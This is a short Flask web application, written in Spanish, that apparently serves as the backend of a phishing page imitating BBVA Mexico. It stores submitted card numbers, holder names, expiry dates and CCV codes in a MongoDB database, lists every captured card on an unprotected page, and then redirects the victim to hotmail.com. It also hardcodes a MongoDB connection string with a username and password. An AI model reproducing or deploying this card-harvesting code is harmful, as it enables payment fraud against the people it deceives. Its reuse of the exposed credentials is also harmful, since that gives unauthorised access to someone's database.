
from flask import Flask, render_template, request, redirect, url_for,jsonify
from pymongo import MongoClient


app = Flask(__name__)
uri = "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# Crear un cliente y conectarse al servidor
client = MongoClient(uri)

# Seleccionar la base de datos y la colección
db = client['bbvamx']
collection = db['mi_coleccion']





@app.route('/')
def index():
    return render_template('index.html')


@app.route('/get_image_urls')
def get_image_urls():
    return jsonify({
        'visa': url_for('static', filename='img/logos/visa.png'),
        'mastercard': url_for('static', filename='img/logos/mastercard.png')
    })


@app.route('/tabla')
def tabla():
    # Obtener todos los documentos de la colección
    documentos = collection.find()
    return render_template('tarjeta.html', documentos=documentos)



@app.route('/submit', methods=['POST'])
def submit():
  # Obtener los datos del formulario
    inputNumero = request.form['inputNumero']
    inputNombre = request.form['inputNombre']
    selectMes = request.form['selectMes']
    selectYear = request.form['selectYear']
    inputCCV = request.form['inputCCV']

    # Insertar los datos en la colección
    documento = {
        "numero_tarjeta": inputNumero,
        "nombre": inputNombre,
        "mes_expiracion": selectMes,
        "year_expiracion": selectYear,
        "ccv": inputCCV
    }
    collection.insert_one(documento)

    # Redirigir a la página principal
    return render_template('1.html')

@app.route('/ver_txt')
def ver_txt():
    # Leer el contenido del archivo de texto
    with open('data.txt', 'r') as file:
        contenido = file.read()

    # Mostrar el contenido en una página web
    return f'<pre>{contenido}</pre>'

@app.route('/success')
def success():
    return redirect('https://hotmail.com')

if __name__ == '__main__':
    app.run(debug=True)

   
